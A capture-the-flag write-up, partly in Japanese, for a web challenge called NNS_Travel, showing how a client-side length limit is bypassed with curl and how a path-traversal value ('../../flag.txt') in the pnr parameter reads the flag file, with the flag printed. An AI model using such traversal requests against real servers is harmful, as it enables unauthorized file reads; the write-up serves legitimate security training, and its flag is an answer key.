## NNS_Travel

Web

Description
NNS Air has launched a brand new travel agency: NNS Air Travel Agency. Now you just need to find the tickets they ordered for you.

The flag is located at /flag.txt.

## Solution

![](1.jpg)


```
          <form>
            <label for="ticket-id">Booking Reference</label>
            <input type="text" id="ticket-id" name="ticket-id" placeholder="ABCDEF" maxlength="6" minlength="6" />
            <div>
              <button>Add</button>
              <p></p>
            </div>
          </form>
        </div>
      </section>
    </main>
    <script>
      fetch('/meta').then((r) => {
        r.json().then((v) => {
          document.querySelector('#team').textContent = v.team;
        });
      });

      document.querySelector('form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const ticketId = document.querySelector('input').value.toUpperCase();
        const errElm = document.querySelector('form > div > p');

        try {
          const req = await fetch(`get-file?pnr=${ticketId}.json`, { method: 'POST' });

          if (req.status !== 200) {
            const json = await req.json();

            if (!json.ok) {
              errElm.textContent = json.error;
            }
          } else {
            errElm.textContent = 'Your ticket has been found.';
          }
        } catch {
          errElm.textContent = 'Unexpected error. Please contact support.';
        }
      });
    </script>
```

./flag.txtをフォームに入力すればいいが6文字までしか入力できない

![](hacker.jpg)

```
      <input type="text" id="ticket-id" name="ticket-id" placeholder="ABCDEF" maxlength="6" minlength="6" />
```

curlからpostすれば文字数制限を突破できる。


試しにHACKER.jsonでテスト

```
localhost:~/web_nns-travel# curl -X POST "https://nns-travel-72aef56a5d86.chall.nnsc.tf/get-
file?pnr=HACKER.json"
```

```
{
  "from": "ENZV",
  "to": "ENGM",
  "solution": "No guessing is required for this challenge :P"
}
```

```
# curl -X POST "https://nns-travel-72aef56a5d86.chall.nnsc.tf/get-
file?pnr=flag.txt"
```
```
{"ok":false,"error":"Ticket not found."}
```
```
# curl -X POST "https://nns-travel-72aef56a5d86.chall.nnsc.tf/get-
file?pnr=./flag.txt"
```
{"ok":false,"error":"Ticket not found."}
```
# curl -X POST "https://nns-travel-72aef56a5d86.chall.nnsc.tf/get-
file?pnr=../flag.txt"
```
{"ok":false,"error":"Ticket not found."}
```
# curl -X POST "https://nns-travel-72aef56a5d86.chall.nnsc.tf/get-file?pnr=../../flag.txt"
```

```
NNS{wh00Ps_You_f0unD_4_Pa7H_tR4v3Rsa1_iN_my_C0de}
```

## Flag

```
NNS{wh00Ps_You_f0unD_4_Pa7H_tR4v3Rsa1_iN_my_C0de}
```